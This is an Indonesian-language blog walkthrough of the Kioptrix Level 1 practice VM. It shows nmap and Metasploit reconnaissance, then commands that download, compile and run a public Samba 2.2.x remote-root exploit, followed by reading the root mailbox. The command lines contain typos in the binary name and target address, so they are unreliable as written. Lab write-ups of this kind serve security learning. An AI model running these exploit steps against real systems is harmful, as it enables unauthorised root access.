<!DOCTYPE html>
<html>

  <head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <title>Pembahasan Kioptrix Level 1 : Samba Exploit</title>
  <meta name="description" content="Assalamualaikum...Kioptrix Level 1 : Samba Exploit - Sudah lama tidak posting lagi di blog, tapi untuk kesempatan kali ini saya akan membahas bagaiman mengex...">
  
  <meta name="author" content="rhama">
  <meta name="copyright" content="&copy; rhama 2017">
  

  <!-- External libraries -->
  <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css">
  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.9.0/styles/monokai-sublime.min.css">
  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/lightbox2/2.7.1/css/lightbox.css">

  <!-- Favicon and other icons (made with http://www.favicon-generator.org/) -->
  <link rel="shortcut icon" href="/assets/icons/favicon.ico" type="image/x-icon">
  <link rel="icon" href="/assets/icons/favicon.ico" type="image/x-icon">
  <link rel="apple-touch-icon" sizes="57x57" href="/assets/icons/apple-icon-57x57.png">
  <link rel="apple-touch-icon" sizes="60x60" href="/assets/icons/apple-icon-60x60.png">
  <link rel="apple-touch-icon" sizes="72x72" href="/assets/icons/apple-icon-72x72.png">
  <link rel="apple-touch-icon" sizes="76x76" href="/assets/icons/apple-icon-76x76.png">
  <link rel="apple-touch-icon" sizes="114x114" href="/assets/icons/apple-icon-114x114.png">
  <link rel="apple-touch-icon" sizes="120x120" href="/assets/icons/apple-icon-120x120.png">
  <link rel="apple-touch-icon" sizes="144x144" href="/assets/icons/apple-icon-144x144.png">
  <link rel="apple-touch-icon" sizes="152x152" href="/assets/icons/apple-icon-152x152.png">
  <link rel="apple-touch-icon" sizes="180x180" href="/assets/icons/apple-icon-180x180.png">
  <link rel="icon" type="image/png" sizes="192x192"  href="/assets/icons/android-icon-192x192.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/assets/icons/favicon-32x32.png">
  <link rel="icon" type="image/png" sizes="96x96" href="/assets/icons/favicon-96x96.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/assets/icons/favicon-16x16.png">
  <link rel="manifest" href="/assets/icons/manifest.json">
  <meta name="msapplication-TileColor" content="#ffffff">
  <meta name="msapplication-TileImage" content="/assets/icons/ms-icon-144x144.png">
  <meta name="theme-color" content="#ffffff">

  
  <!-- Facebook OGP cards -->
<!--   <meta property="og:description" content="Assalamualaikum...Kioptrix Level 1 : Samba Exploit - Sudah lama tidak posting lagi di blog, tapi untuk kesempatan kali ini saya akan membahas bagaiman mengex..." />
  <meta property="og:url" content="https://rhama.my.id" />
  <meta property="og:site_name" content="CTF.Ninja" />
  <meta property="og:title" content="Pembahasan Kioptrix Level 1 : Samba Exploit" />
  <meta property="og:type" content="website" />
  <meta property="og:image" content="https://rhama.my.id/assets/images/ctf.png" />
  <meta property="og:image:type" content="image/png" />
  <meta property="og:image:width" content="612" />
  <meta property="og:image:height" content="605" /> -->
<meta content="https://rhama.my.id/assets/images/ctf.png" property="og:image" />
<meta content="CTF.Ninja" property="og:site_name" />
<meta content="object" property="og:type" />
<meta content="Pembahasan Kioptrix Level 1 : Samba Exploit" property="og:title" />
<meta content="https://rhama.my.id/pentesting/2016/02/27/pembahasan-kioptrix-level-1-samba.html" property="og:url" />
<meta content="Assalamualaikum...Kioptrix Level 1 : Samba Exploit - Sudah lama tidak posting lagi di blog, tapi untuk kesempatan kali ini saya akan membahas bagaiman mengex..." property="og:description" />

  

  

  

  <!-- Site styles -->
  <link rel="stylesheet" href="/css/main.css">
   <link rel="stylesheet" href="/css/terminal.css">
  <link rel="canonical" href="https://rhama.my.id/pentesting/2016/02/27/pembahasan-kioptrix-level-1-samba.html">
  <link rel="alternate" type="application/rss+xml" title="CTF.Ninja" href="https://rhama.my.id/feed.xml" />
</head>


  <body>

    <header class="navigation" role="banner">
  <div class="navigation-wrapper">
    <a href="/" class="logo">
      
      <img src="/assets/logo.png" alt="CTF.Ninja">
      
    </a>
    <a href="javascript:void(0)" class="navigation-menu-button" id="js-mobile-menu">
      <i class="fa fa-bars"></i>
    </a>
    <nav role="navigation">
      <ul id="js-navigation-menu" class="navigation-menu show">
        
          
          <li class="nav-link"><a href="/about/">About</a>
          
        
          
          <li class="nav-link"><a href="/posts/">Archives</a>
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
      </ul>
    </nav>
  </div>
</header>


    <div class="page-content">
        <div class="post">

<div class="post-header-container has-cover" style="background-image: url(/assets/images/ctf.png);">
  <div class="scrim has-cover">
    <header class="post-header">
      <h1 class="title">Pembahasan Kioptrix Level 1 : Samba Exploit</h1>
      <p class="info">by <strong>Aiden Pearce</strong></p>
    </header>
  </div>
</div>

<div class="wrapper">



<section class="post-meta">
  <div class="post-date">February 27, 2016</div>
  <div class="post-categories">
  in 
    
    <a href="/category/Pentesting">Pentesting</a>
    
  
  </div>
</section>

<article class="post-content">
  <div class="separator" style="clear: both; text-align: center;"><a href="https://2.bp.blogspot.com/-KtOVpGSr_r0/Vs_i84FRmwI/AAAAAAAAA5M/pMTE5jhcamY/s1600/Screenshot_2016-02-26_13-29-46.png" imageanchor="1" style="clear: left; float: left; margin-bottom: 1em; margin-right: 1em;"><img border="0" height="197" src="https://2.bp.blogspot.com/-KtOVpGSr_r0/Vs_i84FRmwI/AAAAAAAAA5M/pMTE5jhcamY/s400/Screenshot_2016-02-26_13-29-46.png" width="400" /></a></div><b>Assalamualaikum...</b><br /><b>Kioptrix Level 1</b> : Samba Exploit - Sudah lama tidak posting lagi di blog, tapi untuk kesempatan kali ini saya akan membahas bagaiman mengexploit samba yang ada pada kiotrix server, kioptrix server adalah vulnerable os yang digunakan untuk tujuan pembelajaran dalam hal pentesting.<br /><br /><b>Tool Yang Dibutuhkan</b><br /><ol><li>Nmap</li><li>Metasploit </li><li>Kioptrix Level 1 : <a href="http://www.kioptrix.com/dlvm/Kioptrix_Level_1.rar">Download disini</a></li></ol><span style="font-size: large;"><b>Mencari Ip Target</b></span><br /><br />Dalam mencari ip target, saya menggunakan nmap dengan parameter <b>-sn</b> untuk melakukan Ping scan agar dapat mencari host yg live<br /><br /><blockquote class="tr_bq">root@ubuntu-linux:/home/aiden# nmap -sn 192.168.33.1/24<br /><br />Starting Nmap 7.01 ( https://nmap.org ) at 2016-02-26 13:06 HKT<br /><span style="color: red;">Nmap scan report for 192.168.33.128</span><br />Host is up (0.00042s latency).<br />MAC Address: 00:0C:29:83:B2:94 (VMware)<br />Nmap scan report for 192.168.33.254<br />Host is up (0.000044s latency).<br />MAC Address: 00:50:56:E2:65:F0 (VMware)<br />Nmap scan report for 192.168.33.1<br />Host is up.<br />Nmap done: 256 IP addresses (3 hosts up) scanned in 30.30 seconds</blockquote><b><span style="font-size: large;">Scanning Service Pada Server</span></b><br />Untuk pencarian service atau layanan yang sudah diinstall pada kiotrix server kita gunakan nmap dengan parameter <b>-sV </b>untuk melakukan service version scanning<br /><blockquote class="tr_bq">root@ubuntu-linux:/home/aiden# nmap -sV 192.168.33.128<br /><br />Starting Nmap 7.01 ( https://nmap.org ) at 2016-02-26 13:38 HKT<br />Nmap scan report for 192.168.33.128<br />Host is up (0.00022s latency).<br />Not shown: 994 closed ports<br />PORT&nbsp;&nbsp;&nbsp;&nbsp; STATE SERVICE&nbsp;&nbsp;&nbsp;&nbsp; VERSION<br />22/tcp&nbsp;&nbsp; open&nbsp; ssh&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; OpenSSH 2.9p2 (protocol 1.99)<br />80/tcp&nbsp;&nbsp; open&nbsp; http&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Apache httpd 1.3.20 ((Unix)&nbsp; (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)<br />111/tcp&nbsp; open&nbsp; rpcbind&nbsp;&nbsp;&nbsp;&nbsp; 2 (RPC #100000)<br /><span style="color: red;"><span style="background-color: white;">139/tcp&nbsp; open&nbsp; netbios-ssn Samba smbd (workgroup: MYGROUP)</span></span><br />443/tcp&nbsp; open&nbsp; ssl/http&nbsp;&nbsp;&nbsp; Apache httpd 1.3.20 ((Unix)&nbsp; (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)<br />1024/tcp open&nbsp; status&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 1 (RPC #100024)<br />MAC Address: 00:0C:29:83:B2:94 (VMware)</blockquote><b><span style="font-size: large;">Scanning Samba Version</span></b><br /><br />Setelah melakukan service scanning kita lanjutkan dengan mencari versi dari samba yang sudah diinstall di kiotrix menggunakan modul <b>auxiliary</b> pada <b>metasploit</b><br /><br /><blockquote class="tr_bq">msf &gt; search smb_version<br /><br />Matching Modules<br />================<br /><br />&nbsp;&nbsp; Name&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Disclosure Date&nbsp; Rank&nbsp;&nbsp;&nbsp; Description<br />&nbsp;&nbsp; ----&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ---------------&nbsp; ----&nbsp;&nbsp;&nbsp; -----------<br />&nbsp;&nbsp; auxiliary/scanner/smb/smb_version&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; normal&nbsp; SMB Version Detection<br /><br />msf &gt; use auxiliary/scanner/smb/smb_version<br />msf auxiliary(smb_version) &gt; show options<br /><br />Module options (auxiliary/scanner/smb/smb_version):<br /><br />&nbsp;&nbsp; Name&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Current Setting&nbsp; Required&nbsp; Description<br />&nbsp;&nbsp; ----&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ---------------&nbsp; --------&nbsp; -----------<br />&nbsp;&nbsp; RHOSTS&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; yes&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; The target address range or CIDR identifier<br />&nbsp;&nbsp; SMBDomain&nbsp; .&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; no&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; The Windows domain to use for authentication<br />&nbsp;&nbsp; SMBPass&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; no&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; The password for the specified username<br />&nbsp;&nbsp; SMBUser&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; no&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; The username to authenticate as<br />&nbsp;&nbsp; THREADS&nbsp;&nbsp;&nbsp; 1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; yes&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; The number of concurrent threads<br /><br />msf auxiliary(smb_version) &gt; set RHOSTS 192.168.33.128<br />RHOSTS =&gt; 192.168.33.128<br />msf auxiliary(smb_version) &gt; run<br /><br />[*] 192.168.33.128:139 could not be identified: <span style="color: red;">Unix (Samba 2.2.1a)</span><br />[*] Scanned 1 of 1 hosts (100% complete)<br />[*] Auxiliary module execution completed</blockquote><span style="font-size: large;"><b>Exploiting Samba</b></span><br /><br />Kita tidak perlu bingung mau menggunakan exploit apa, karena samba 2.2.x memiliki exploit yang sudah dibuat yaitu <i>0x333hate =&gt; samba 2.2.x remote root</i> exploit, sebenar nya bisa juga dengan trans2open exploit di metasploit, tapi karena metasploit saya lagi error jadi saya make 0x333hate yang base on trans2open.<br /><br />~# wget http://downloads.securityfocus.com/vulnerabilities/exploits/0x333hate.c<br />~# gcc 0x333hate.c -o xpl<br />~# ./xlp -t 192.168.33.1<br /><br />kita sudah mendapatkan shell akses ke system kioptrix.<br /><div class="separator" style="clear: both; text-align: center;"><a href="https://2.bp.blogspot.com/-UckxfiKkYXQ/VtGPpSnfXlI/AAAAAAAAA5c/WsMx7VHVpe4/s1600/Screenshot_2016-02-27_19-58-32.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="265" src="https://2.bp.blogspot.com/-UckxfiKkYXQ/VtGPpSnfXlI/AAAAAAAAA5c/WsMx7VHVpe4/s640/Screenshot_2016-02-27_19-58-32.png" width="640" /></a></div><br />Ingat <b>"Shell is Only the Beginning"</b> , lalu apa yang harus dilakukan ? karena tidak ada clue, ane iseng mencari file <i>.bash_history</i> untuk melihat command apa aja yang pernah di ketik<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="https://1.bp.blogspot.com/-szwVtHkBHtQ/VtGRJB25jgI/AAAAAAAAA5o/n7hx7E4l3rc/s1600/Selection_003.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="265" src="https://1.bp.blogspot.com/-szwVtHkBHtQ/VtGRJB25jgI/AAAAAAAAA5o/n7hx7E4l3rc/s640/Selection_003.png" width="640" /></a></div><br />Ada commad <i>mail</i> yang digunakan untuk email proses<br />lalu tinggal ketik aja di shell nya<br /><blockquote class="tr_bq"># mail&nbsp; &lt;-- untuk melihat list email<br /># exit &lt;-- agar keluar dari perintah mail<br /># cat /var/mail/root</blockquote><div class="separator" style="clear: both; text-align: center;"><a href="https://1.bp.blogspot.com/-GEi-CPX2ZDs/VtGSkIhPWnI/AAAAAAAAA50/tyXaOBN08o0/s1600/Screenshot%2Bfrom%2B2016-02-27%2B20-06-27.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="531" src="https://1.bp.blogspot.com/-GEi-CPX2ZDs/VtGSkIhPWnI/AAAAAAAAA50/tyXaOBN08o0/s640/Screenshot%2Bfrom%2B2016-02-27%2B20-06-27.png" width="640" /></a></div><br />Rupa nya isi email tersebut agar kita bisa lanjut ke level 2 kiotrix nya ^_^<br /><br />sekian tutorial sederhana dari saya. semoga dapat bermanfaat bagi kita semua dan mohon maaf apa bila ada salah pemberian definisi :D
</article>



<section class="tags">
  <strong>Tags:</strong> <a href="/tag/Pentesting">Pentesting</a>,&nbsp;<a href="/tag/CTF">CTF</a>
</section>



<section class="rss">
  <p class="rss-subscribe text"><strong>Subscribe <a href="/feed.xml">via RSS</a></strong></p>
</section>

<section class="share">
  <span>Share: </span>
  
    
    
    
      <a href="//www.facebook.com/sharer.php?t=Pembahasan+Kioptrix+Level+1+%3A+Samba+Exploit&u=https%3A%2F%2Frhama.my.id%2Fpentesting%2F2016%2F02%2F27%2Fpembahasan-kioptrix-level-1-samba.html"
        onclick="window.open(this.href, 'facebook-share', 'width=550,height=255');return false;">
        <i class="fa fa-facebook-square fa-lg"></i>
      </a>
    
    
    
    
    
    
  
    
    
    
    
    
    
    
    
  
    
    
    
    
    
    
    
    
  
    
    
    
    
    
    
    
    
  
    
    
    
    
    
    
    
    
  
    
    
    
    
    
    
    
    
  
    
    
    
    
    
    
    
    
  
    
    
    
    
    
    
    
    
  
    
    
    
    
    
    
    
    
  
    
    
    
    
    
    
    
    
  
    
    
    
    
    
    
    
    
  
    
    
    
    
    
    
    
      <a href="//www.reddit.com/submit" onclick="window.location = '//www.reddit.com/submit?url=' + encodeURIComponent('https://rhama.my.id/pentesting/2016/02/27/pembahasan-kioptrix-level-1-samba.html') + '&title=Pembahasan Kioptrix Level 1 : Samba Exploit'; return false">
        <i class="fa fa-reddit-square fa-lg"></i>
      </a>
    
    
  
    
    
    
    
    
    
    
    
  
</section>




</div>
</div>

    </div>

    <footer class="site-footer">

  <div class="wrapper">

    <h3 class="footer-heading">CTF.Ninja</h3>

    <div class="site-navigation">

      <p><strong>Site Map</strong></p>
      <ul class="pages">
        
        
          <li class="nav-link"><a href="/about/">About</a>
        
        
        
          <li class="nav-link"><a href="/posts/">Archives</a>
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
      </ul>
    </div>

    <div class="site-contact">

      <p><strong>Contact</strong></p>
      <ul class="social-media-list">
        <li>
          <a href="mailto:r4m@protonmail.com">
            <i class="fa fa-envelope-o"></i>
            <span class="username">r4m@protonmail.com</span>
          </a>
        </li>

        
          
          <li>
            <a href="https://www.facebook.com/eat.sleep.pwn.repeat" title="Friend me on Facebook">
              <i class="fa fa-facebook"></i>
              <span class="username">eat.sleep.pwn.repeat</span>
            </a>
          </li>
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        

      </ul>
    </div>

    <div class="site-signature">
      <p class="rss-subscribe text"><strong>Subscribe <a href="/feed.xml">via RSS</a></strong></p>
      <p class="text">CTF, InfoSec, Banana And More.
</p>
    </div>

  </div>

</footer>

<!-- Scripts -->
<script src="//code.jquery.com/jquery-1.11.2.min.js"></script>
<script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/8.5/highlight.min.js"></script>
<script src="//cdnjs.cloudflare.com/ajax/libs/lightbox2/2.7.1/js/lightbox.min.js"></script>

<script type="text/javascript">
$(document).ready(function() {
  // Default syntax highlighting
  hljs.initHighlightingOnLoad();

  // Header
  var menuToggle = $('#js-mobile-menu').unbind();
  $('#js-navigation-menu').removeClass("show");
  menuToggle.on('click', function(e) {
    e.preventDefault();
    $('#js-navigation-menu').slideToggle(function(){
      if($('#js-navigation-menu').is(':hidden')) {
        $('#js-navigation-menu').removeAttr('style');
      }
    });
  });
});

</script>






  </body>

</html>
